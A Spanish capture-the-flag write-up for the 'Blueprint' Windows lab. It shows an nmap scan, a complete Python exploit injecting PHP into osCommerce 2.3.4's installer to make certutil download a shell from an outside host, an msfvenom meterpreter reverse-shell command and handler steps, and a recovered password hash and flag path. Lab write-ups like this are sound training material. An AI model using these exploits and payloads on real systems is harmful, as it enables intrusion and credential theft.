![image](https://github.com/user-attachments/assets/34f83e52-5920-46f4-8a40-f1b3eb4483c3)<h1 align="center">Blueprint</h1>

# INTRODUCCIÓN

Nos enfrentamos a una máquina Windows en la que deberemos escalar privilegios.

## TEST DE CONECTIVIDAD

![image](https://github.com/user-attachments/assets/b54666ac-9172-42ff-b695-3e06372ab6d8)

## ESCANEO DE PUERTOS


Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-20 08:31 BST
Nmap scan report for ip-10-10-51-138.eu-west-1.compute.internal (10.10.51.138)
Host is up (0.18s latency).
Not shown: 787 filtered ports, 200 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:D3:E0:71:8A:83 (Unknown)
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:d3:e0:71:8a:83 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-20T08:32:18+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-20 08:32:18
|_  start_date: 2024-08-20 08:29:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Después de tantas cosas vamos a explorar parte por parte.

Primero de todo el puerto 80 HTTP a ver que encontramos.

No encontramos nada importante, pero si probamos el puerto 443 si que encontramso cositas importantes.

![image](https://github.com/user-attachments/assets/b8cee081-bb4d-483d-a6bb-04f6cd4fd336)

Gracias a esto vemos que utiliza "oscommerce" en la verisón 2.3.4 busquemos a ver si encontramos algo.

![image](https://github.com/user-attachments/assets/d20678af-6230-4d3a-b30e-b6a59114a198)


```
import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
payload += 'echo $var;'
payload += '/*'


data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
```

Vamos a probar si funciona cambiando la url importante.

De tanto probar no me habia dado cuenta que jamás me habría dejado por el puerto 443 por ssl, encontramos que también hay la misma página alojada por el puerto 8080 osea que voy a probar con eso.

```
shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
```

Por este comando deberemos crear una shell.php y un servidor de python

![image](https://github.com/user-attachments/assets/c490995b-1d67-4c77-8f10-0a52cf0c88ab)

```
python -m http.server
```

A mi esta forma me ha fallado por todos los lados voy a utilizar metasploit losiento.

![image](https://github.com/user-attachments/assets/de79252e-8c59-40b8-923d-cd63c6fe5d61)

![image](https://github.com/user-attachments/assets/ba468196-f37f-49c8-8795-ae643a70a353)

Ahora deberemos crear una nueva session y meter el payload para tener una buena shell

Control + z y ponemos en background la sesión.

![image](https://github.com/user-attachments/assets/2eea2e51-cc11-4dc6-87d2-46e0981b688b)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.153.147 LPORT=<Your Port to Connect On> -f exe > shell.exe
```
Ya con esto creado la metemos dentro de la msfconsole descargandolo

```
upload /root/shell.exe
```

![image](https://github.com/user-attachments/assets/2dfbe18c-5c87-40ec-baa4-b051c6f4db6a)

Mientras estamos con otra msfconsole con una munti/handler con el payload de reverse_tcp

![image](https://github.com/user-attachments/assets/d7090432-e181-4192-b925-9cf79fd80891)

Ya dentro sacamos los hashes y ademas estamos como roots

![image](https://github.com/user-attachments/assets/7d920433-40a4-4f5c-8a38-1872c660411c)

El hash que tenemos que sacar es el segundo osea : 30e87bf999828446a1c1209ddde4c450

Con esto ya tenemos el hash y la ruta del root

en C:\Users\Administrator\Desktop\root.txt

GG
